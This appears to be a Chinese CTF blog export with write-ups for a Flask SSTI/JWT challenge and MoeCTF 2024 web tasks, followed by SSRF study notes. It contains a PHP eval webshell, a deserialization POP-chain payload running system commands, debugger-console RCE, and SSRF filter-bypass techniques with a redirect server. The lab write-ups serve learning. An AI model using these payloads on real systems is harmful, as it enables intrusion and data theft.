<h1 id="地狱通讯-改"><a href="#地狱通讯-改" class="headerlink" title="地狱通讯 - 改"></a>地狱通讯 - 改</h1><p>题目：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, session, redirect, make_response</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> secret, headers, User</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;app.py&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">    ctx = f.read()</span><br><span class="line">    f.close()</span><br><span class="line">    res = make_response(ctx)</span><br><span class="line">    name = request.args.get(<span class="string">&#x27;name&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">in</span> name <span class="keyword">or</span> name == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    payload = &#123;</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: name,</span><br><span class="line">    &#125;</span><br><span class="line">    token = jwt.encode(payload, secret, algorithm=<span class="string">&#x27;HS256&#x27;</span>, headers=headers)</span><br><span class="line">    res.set_cookie(<span class="string">&#x27;token&#x27;</span>, token)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>():</span><br><span class="line">    token = request.cookies.get(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> token:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/&#x27;</span>, <span class="number">302</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        name = jwt.decode(token, secret, algorithms=[<span class="string">&#x27;HS256&#x27;</span>])[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">    <span class="keyword">except</span> jwt.exceptions.InvalidSignatureError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Invalid token&quot;</span></span><br><span class="line">    <span class="keyword">if</span> name != <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">        user = User(name)</span><br><span class="line">        flag = request.args.get(<span class="string">&#x27;flag&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">        message = <span class="string">&quot;Hello &#123;0&#125;, your flag is&quot;</span> + flag</span><br><span class="line">        <span class="keyword">return</span> message.<span class="built_in">format</span>(user)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;flag.html&#x27;</span>, name=name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure></div>

<p>该 Web 应用有两个路由：</p>
<p>&#x2F;（index()）：<br>读取 app.py 文件的内容并返回作为 HTTP 响应。<br>如果用户在 URL 参数 name 中提供了一个值，就生成一个 JWT 令牌（排除 “admin”）。<br>令牌存储在 token cookie 中。<br>&#x2F;hello（hello()）：<br>检查用户是否携带 token cookie，如果没有，则重定向到 &#x2F;。<br>解析 JWT 令牌，提取 name。<br>如果 name 不是 “admin”，就返回一条个性化的消息。<br>如果 name 是 “admin”，则渲染 flag.html。<br>我们先创建一个用户得到token<br><img src="https://pic1.imgdb.cn/item/67b9fbe0d0e0a243d4023a6a.png"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STYLUS"><figure class="iseeu highlight /stylus"><table><tr><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9<span class="selector-class">.eyJuYW1lIjoiaGFjayJ9</span>.qBmUAhskQCDOFXDZfDBtaRmR92EJUo_xLiPa5VfHkKc</span><br></pre></td></tr></table></figure></div>

<p>然后访问 &#x2F;hello路由，用这个token作为cookie，然后用上题一样的stti漏洞<br><img src="https://pic1.imgdb.cn/item/67b9fc99d0e0a243d4023a7c.png"><br>得到secret和headers<br><img src="https://pic1.imgdb.cn/item/67b9fcded0e0a243d4023ac8.png"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ACTIONSCRIPT"><figure class="iseeu highlight /actionscript"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;secret&#x27;</span>: <span class="string">&#x27;u_have_kn0w_what_f0rmat_i5&#x27;</span>, </span><br><span class="line"><span class="string">&#x27;headers&#x27;</span>: &#123;<span class="string">&#x27;alg&#x27;</span>: <span class="string">&#x27;HS256&#x27;</span>, <span class="string">&#x27;typ&#x27;</span>: <span class="string">&#x27;JWT&#x27;</span>&#125;, <span class="string">&#x27;User&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;secret.User&#x27;</span>&gt;&#125;</span><br></pre></td></tr></table></figure></div>
<p>然后去一个jwt加密网站 <a href="http://jwt.io/">http://jwt.io/</a><br>这是个签名，我们先把headers修改一下，然后输入secret，最后输入刚才token。因为这样才是认证签名<br>再把name改成admin<br><img src="https://pic1.imgdb.cn/item/67ba0211d0e0a243d4023ba9.png"></p>
<p>得到</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STYLUS"><figure class="iseeu highlight /stylus"><table><tr><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9<span class="selector-class">.eyJuYW1lIjoiYWRtaW4ifQ</span>.jlAcmWWxtmNLxbxwfRE45Fxf16dX6LQmrK_1dgx7zmg</span><br></pre></td></tr></table></figure></div>
<p>再去bp把这个admin的token给cookie</p>
<p><img src="https://pic1.imgdb.cn/item/67ba0466d0e0a243d4023bcc.png"></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>moectf_2024web</title>
    <url>/posts/36666.html</url>
    <content><![CDATA[<p>Moectf_2024web方向wp</p>
<span id="more"></span>

<h1 id="垫刀之路01-MoeCTF？启动！"><a href="#垫刀之路01-MoeCTF？启动！" class="headerlink" title="垫刀之路01: MoeCTF？启动！"></a>垫刀之路01: MoeCTF？启动！</h1><p><img src="https://pic1.imgdb.cn/item/67cd0887066befcec6e18c5f.png"><br>这里可以执行任何指令 输入cat &#x2F;flag之后提示 你可以检查一下环境变量这个东西<br>输入env得到环境变量，看到flag</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">执行结果：</span><br><span class="line"></span><br><span class="line"><span class="attribute">PHP_EXTRA_CONFIGURE_ARGS</span>=--enable-fpm <span class="attribute">--with-fpm-user</span>=www-data <span class="attribute">--with-fpm-group</span>=www-data --disable-cgi <span class="attribute">KUBERNETES_SERVICE_PORT</span>=443 <span class="attribute">KUBERNETES_PORT</span>=tcp://10.43.0.1:443 <span class="attribute">USER</span>=www-data <span class="attribute">HOSTNAME</span>=ret2shell-106-7154-1741490286 <span class="attribute">PHP_INI_DIR</span>=/usr/local/etc/php <span class="attribute">SHLVL</span>=2 <span class="attribute">HOME</span>=/home/www-data <span class="attribute">PHP_LDFLAGS</span>=-Wl,-O1 -Wl,<span class="attribute">--hash-style</span>=both -pie <span class="attribute">PHP_CFLAGS</span>=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE <span class="attribute">-D_FILE_OFFSET_BITS</span>=64 PHP_MD5= <span class="attribute">PHP_VERSION</span>=7.3.11 <span class="attribute">GPG_KEYS</span>=CBAF69F173A0FEA4B537F470D66C9593118BCCB6 F38252826ACD957EF380D39F2F7956BC5DA04B5D <span class="attribute">PHP_CPPFLAGS</span>=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE <span class="attribute">-D_FILE_OFFSET_BITS</span>=64 <span class="attribute">PHP_ASC_URL</span>=https://www.php.net/get/php-7.3.11.tar.xz.asc/from/this/mirror <span class="attribute">PHP_URL</span>=https://www.php.net/get/php-7.3.11.tar.xz/from/this/mirror <span class="attribute">KUBERNETES_PORT_443_TCP_ADDR</span>=10.43.0.1 <span class="attribute">PATH</span>=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin <span class="attribute">KUBERNETES_PORT_443_TCP_PORT</span>=443 <span class="attribute">KUBERNETES_PORT_443_TCP_PROTO</span>=tcp <span class="attribute">KUBERNETES_SERVICE_PORT_HTTPS</span>=443 <span class="attribute">KUBERNETES_PORT_443_TCP</span>=tcp://10.43.0.1:443 <span class="attribute">PHPIZE_DEPS</span>=autoconf dpkg-dev dpkg file g++ gcc libc-dev make pkgconf re2c <span class="attribute">KUBERNETES_SERVICE_HOST</span>=10.43.0.1 <span class="attribute">PWD</span>=/var/www/html <span class="attribute">PHP_SHA256</span>=657cf6464bac28e9490c59c07a2cf7bb76c200f09cfadf6e44ea64e95fa01021 <span class="attribute">FLAG</span>=moectf&#123;WelcOme_to_MoEcTf_anD_r0aDI_STArTuP-6Y_SxRHhh166&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="垫刀之路02-普通的文件上传"><a href="#垫刀之路02-普通的文件上传" class="headerlink" title="垫刀之路02: 普通的文件上传"></a>垫刀之路02: 普通的文件上传</h1><p><img src="https://pic1.imgdb.cn/item/67cd093a066befcec6e18cf9.png"><br>一句话木马：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>文件直接就可以上传，打开蚁剑连接 找了一圈没有找到flag<br>在蚁剑的虚拟终端中用php -i查看php的信息，在环境中找到了flag<br><img src="https://pic1.imgdb.cn/item/67cd0a90066befcec6e18f30.png"></p>
<h1 id="垫刀之路03-这是一个图床"><a href="#垫刀之路03-这是一个图床" class="headerlink" title="垫刀之路03: 这是一个图床"></a>垫刀之路03: 这是一个图床</h1><p>这题也是一个文件上传，但是对文件的类型做了限制，只能上传图片<br>把一句话木马的格式改成jpg上传，但是用bp修改后缀后上传<br><img src="https://pic1.imgdb.cn/item/67cd3f67066befcec6e1d68e.png"><br>蚁剑打开<br><img src="https://pic1.imgdb.cn/item/67cd3f95066befcec6e1d6c7.png"><br>和上题一样，也要在蚁剑的虚拟终端里面用env或者php -i 找到环境变量的flag</p>
<h1 id="垫刀之路04-一个文件浏览器"><a href="#垫刀之路04-一个文件浏览器" class="headerlink" title="垫刀之路04: 一个文件浏览器"></a>垫刀之路04: 一个文件浏览器</h1><p>题目描述：<br>Sxrhhh 做了一个文件浏览器，塞了很多东西进去。不知道你能不能从这一堆乱七八糟的文件里面，翻出你想要的 flag 呢？</p>
<p>注意：题目中有一些 readme 文件，我觉得你不应该错过。</p>
<p>再注：本题与 jail-lv1 考点无关，只是致敬 （cue） 一下 flag 位置<br><img src="https://pic1.imgdb.cn/item/67cd4033066befcec6e1d7ce.png"><br>先是根据题目的提示看了两个readme.md文件，但是没有发现什么隐藏的内容<br><img src="https://pic1.imgdb.cn/item/67cd41a7066befcec6e1da53.png"><br>但是发现这里访问文件的方式是get的参数，所以猜测可以目录穿越<br><img src="https://pic1.imgdb.cn/item/67cd41e9066befcec6e1dae8.png"><br>发现是可以的 到根目录下面，排除bin dev etc这些系统文件的目录之后一个个找  最后找到在&#x2F;tmp&#x2F;flag</p>
<h1 id="垫刀之路05-登陆网站"><a href="#垫刀之路05-登陆网站" class="headerlink" title="垫刀之路05: 登陆网站"></a>垫刀之路05: 登陆网站</h1><p>题目描述<br>这是一个登陆页面。听说管理员叫 admin123 ，而且只要登陆成功，就会显示 flag 。可是，听管理员自己说，它自己的密码在密码强度检查器网站上，需要上百年才能被破译。那么，我们应该怎么登陆进去呢？</p>
<p><img src="https://pic1.imgdb.cn/item/67cd42b4066befcec6e1dc73.png"><br>只有一个登录界面，根据题目的描述，知道了管理员账号，但是密码无法爆破出来<br>原来我是想试试sql注入有没有报错的回显的，没想到直接就出来flag了  这里的逻辑应该就是一个简单的拼接，把后面注释掉就满足条件了<br><img src="https://pic1.imgdb.cn/item/67cd431d066befcec6e1dd20.png"></p>
<h1 id="垫刀之路06-pop-base-mini-moe"><a href="#垫刀之路06-pop-base-mini-moe" class="headerlink" title="垫刀之路06: pop base mini moe"></a>垫刀之路06: pop base mini moe</h1><p>一道反序列化的题</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 注意 private 属性的序列化哦</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$evil</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如何赋值呢</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$s</span> = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        <span class="variable">$s</span>(<span class="variable language_">$this</span>-&gt;evil);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$c</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$s</span> = <span class="variable language_">$this</span>-&gt;b;</span><br><span class="line">        <span class="variable">$s</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]))</span><br><span class="line"> &#123;</span><br><span class="line">     <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span> &#123;</span><br><span class="line">     <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></div>
<p>当<strong>试图把一个对象当作函数调用</strong>时，就会自动触发 <code>__invoke()</code> 方法。<br>随意要触发这个方法就要用到A类中的<code>$s($this-&gt;evil);</code>这里让<code>$s</code>是B类就可以触发invoke方法。<br>但是对于私有属性来说，不能直接赋值成一个对象。也不能在外部赋值，需要用到__construct函数<br>这题的pop链就是让evil是我们要执行的命令<code>&quot;cat /flag&quot;</code> 用<code>$s</code>中的a触发B类，B类中的<code>$b</code>是我们想要执行的函数<code>system</code><br><code>$evil</code>作为参数<code>$c</code>传入invoke<br>payload:</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 注意 private 属性的序列化哦</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$evil</span> = <span class="string">&quot;cat /flag&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如何赋值呢</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; a = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$b</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$x</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$x</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>第一次没有用urlencode会报错 </p>
<h1 id="垫刀之路07-泄漏的密码"><a href="#垫刀之路07-泄漏的密码" class="headerlink" title="垫刀之路07: 泄漏的密码"></a>垫刀之路07: 泄漏的密码</h1><p>题目描述<br>Sxrhhh 正在使用 Flask 编写网站服务器，不慎泄漏了 PIN 码, 是时候给他一个乱用调试模式的教训了。<br>这是一个关于 Flask Debug Mode PIN 码泄露 的安全问题，通常意味着目标服务器运行在 Flask Debug 模式下，如果你能访问 Flask 的 Werkzeug Debugger，就可以执行任意 Python 代码（RCE）。<br>找到Flask Debugger 页面 &#x2F;console 或 &#x2F;_debugger 使用pin码解锁<br><img src="https://pic1.imgdb.cn/item/67cd4d25066befcec6e1edd3.png"><br>但是这里直接用os.system执行命令只会输出0 因为这是在console中<br>这里要用os.popen().read()函数，这个函数会执行shell命令并获取返回的内容</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LUA"><figure class="iseeu highlight /lua"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; import <span class="built_in">os</span>;<span class="built_in">os</span>.<span class="built_in">popen</span>(<span class="string">&quot;cat flag&quot;</span>).<span class="built_in">read</span>()</span><br><span class="line"><span class="string">&#x27;moectf&#123;Dont_UsinG-flasK-By_DebUG-MOD-AND_lE4K-y0UR-pIn19&#125;&#x27;</span></span><br></pre></td></tr></table></figure></div>

<h1 id="弗拉格之地的入口"><a href="#弗拉格之地的入口" class="headerlink" title="弗拉格之地的入口"></a>弗拉格之地的入口</h1><p>题目描述<br>听闻在遥远的弗拉格之地，有着七颗龙珠。<br>只要集齐这七颗龙珠，就可以召唤出每一位 ctf 选手都想要的 flag<br>但是这个弗拉格之地与世隔绝，几乎没人能找到入口<br>不过，有一种生物，名为爬虫，它能带领各位找到那里</p>
<p>提示是爬虫，所以就去robots.txt中看，这个文件是每个网站的允许爬虫和禁止爬虫的目录列表<br><img src="https://pic1.imgdb.cn/item/67cd48bc066befcec6e1e5ef.png"><br>访问这里出现的php文件之后拿到flag</p>
<h1 id="ImageCloud前置"><a href="#ImageCloud前置" class="headerlink" title="ImageCloud前置"></a>ImageCloud前置</h1><p>题目描述<br>url后面怎么有个?url&#x3D;, 啧啧啧，这貌似是一个很经典的漏洞, flag在&#x2F;etc&#x2F;passwd里，嗯？这是一个什么文件 声明：题目环境出不了网，无法访问http资源，但这并不影响做题，您可以拿着源码本地测试</p>
<p>把题目的源码拿过来看一下</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="literal">false</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="literal">true</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$image_info</span> = <span class="title function_ invoke__">getimagesizefromstring</span>(<span class="variable">$res</span>);</span><br><span class="line"><span class="variable">$mime_type</span> = <span class="variable">$image_info</span>[<span class="string">&#x27;mime&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: &#x27;</span> . <span class="variable">$mime_type</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$res</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>所以这题就是一个ssrf漏洞，这里的url没有做限制，根据题目的描述，flag就在&#x2F;etc&#x2F;passwd里  所以用flag协议读一下文件就出来了<br><img src="https://pic1.imgdb.cn/item/67cd4b0a066befcec6e1eab6.png"><br>关于ssrf我也出过一个bp实验室的这个专题的blog </p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>SSRF漏洞学习笔记</title>
    <url>/posts/37808.html</url>
    <content><![CDATA[<p>SSRF漏洞学习笔记</p>
<span id="more"></span>

<h2 id="什么是SSRF（服务器端请求伪造）漏洞"><a href="#什么是SSRF（服务器端请求伪造）漏洞" class="headerlink" title="什么是SSRF（服务器端请求伪造）漏洞"></a>什么是SSRF（服务器端请求伪造）漏洞</h2><p>服务器端请求伪造是一种网络安全漏洞，允许攻击者导致服务器端应用程序向非预期位置发出请求。<br>一些服务只允许在内部的服务器之间访问，SSRF漏洞就是让服务器访问外部的资源，从而导致敏感信息泄漏、命令执行等问题</p>
<h2 id="常见的SSRF攻击"><a href="#常见的SSRF攻击" class="headerlink" title="常见的SSRF攻击"></a>常见的SSRF攻击</h2><p>SSRF 攻击通常利用信任关系来升级易受攻击的应用程序的攻击并执行未经授权的操作。这些信任关系可能与服务器有关，也可能与同一组织内的其他后端系统有关。</p>
<h3 id="针对服务器的SSRF攻击"><a href="#针对服务器的SSRF攻击" class="headerlink" title="针对服务器的SSRF攻击"></a>针对服务器的SSRF攻击</h3><p>在针对服务器的 SSRF 攻击中，攻击者会让应用程序通过其环回网络接口（比如127.0.0.1或者localhost）向托管该应用程序的服务器发出 HTTP 请求。</p>
<p>例如，假设有一个购物应用程序，它允许用户查看某个商店中某件商品是否有货。为了提供库存信息，该应用程序必须查询各种后端 REST API。它通过前端 HTTP 请求将 URL 传递到相关的后端 API 端点来实现这一点。当用户查看某件商品的库存状态时，他们的浏览器会发出以下请求：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/product/stock</span> <span class="meta">HTTP/1.0</span></span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>118</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">stockApi</span>=http://stock.weliketoshop.net:<span class="number">8080</span>/product/stock/check%<span class="number">3</span>FproductId%<span class="number">3</span>D6%<span class="number">26</span>storeId%<span class="number">3</span>D1</span></span><br></pre></td></tr></table></figure></div>
<p>这会导致服务器向指定的 URL 发出请求，检索库存状态，并将其返回给用户。<br>如果攻击者可以指定访问的URL 如</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="INI"><figure class="iseeu highlight /ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">stockApi</span>=http://localhost/admin</span><br></pre></td></tr></table></figure></div>
<p>那服务器就会获取&#x2F;admin的内容返回给用户<br>但管理功能通常只有经过身份验证的用户才能访问。这意味着攻击者不会看到任何有趣的东西但是，如果对 &#x2F;admin URL 的请求来自本地计算机，则正常的访问控制将被绕过。<br><img src="https://pic1.imgdb.cn/item/67c30d9bd0e0a243d4093278.png"><br>比如这里访问商品库存的时候有一个<code>stockApi</code>，我们可以前去访问localhost&#x2F;admin，找到一个删除用户的选项，但是一般有管理员身份验证，无法删除，但是这里是get请求，用url访问的，所以可以记下这的url然后再利用localhost来伪造这个请求，就可以绕过检测</p>
<h3 id="针对其他后端系统的-SSRF-攻击"><a href="#针对其他后端系统的-SSRF-攻击" class="headerlink" title="针对其他后端系统的 SSRF 攻击"></a>针对其他后端系统的 SSRF 攻击</h3><p>在某些情况下，应用服务器能够与用户无法直接访问的后端系统进行交互。这些系统通常具有不可路由的私有 IP 地址。后端系统通常受网络拓扑保护，因此它们的安全状况通常较弱。在许多情况下，内部后端系统包含敏感功能，任何能够与系统交互的人都可以在未经身份验证的情况下访问这些功能。</p>
<h2 id="绕过SSRF常见的防御"><a href="#绕过SSRF常见的防御" class="headerlink" title="绕过SSRF常见的防御"></a>绕过SSRF常见的防御</h2><h3 id="具有基于黑名单的输入过滤器的-SSRF"><a href="#具有基于黑名单的输入过滤器的-SSRF" class="headerlink" title="具有基于黑名单的输入过滤器的 SSRF"></a>具有基于黑名单的输入过滤器的 SSRF</h3><p>某些应用程序会阻止包含主机名（如 127.0.0.1 和 localhost 或敏感 URL（如 &#x2F;admin 的输入。可以用以下几种过滤方法</p>
<ul>
<li>使用 127.0.0.1 的替代 IP 表示形式，例如 2130706433 或 127.1 017700000001  （不同的进制）</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ASCIIDOC"><figure class="iseeu highlight /asciidoc"><table><tr><td class="code"><pre><span class="line">(127 × 256³) <span class="code">+ (0 × 256²) +</span> (0 × 256¹) + (1 × 256⁰)</span><br><span class="line"><span class="section">= 2130706433</span></span><br></pre></td></tr></table></figure></div>
<ul>
<li>注册自己的域名，解析成<code>127.0.0.1</code></li>
<li>使用 URL 编码或大小写变体来混淆被阻止的字符串。</li>
<li>提供 控制的 URL，该 URL 会重定向到目标 URL。尝试对目标 URL 使用不同的重定向代码以及不同的协议。例如，在重定向期间从 http: 切换到 https: URL 已被证明可以绕过一些反 SSRF 过滤器。</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask import Flask, redirect, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">&#x27;/redirect&#x27;</span>)</span><br><span class="line">def ssrf_redirect():</span><br><span class="line">    target = request.args.<span class="built_in">get</span>(<span class="string">&#x27;url&#x27;</span>, <span class="string">&#x27;http://127.0.0.1&#x27;</span>)</span><br><span class="line">    return redirect(target, <span class="attribute">code</span>=302)  # 可以换成 301, 307, 308</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.<span class="built_in">run</span>(<span class="attribute">host</span>=<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="attribute">port</span>=8080)  # 允许局域网访问</span><br></pre></td></tr></table></figure></div>
<p><img src="https://pic1.imgdb.cn/item/67c312b8d0e0a243d4093536.png"><br>在这个例子中，网站过滤了127.0.0.1，用上面的进制转换可以绕过，然后发现&#x2F;admin也被过滤，可以用双重url编码绕过</p>
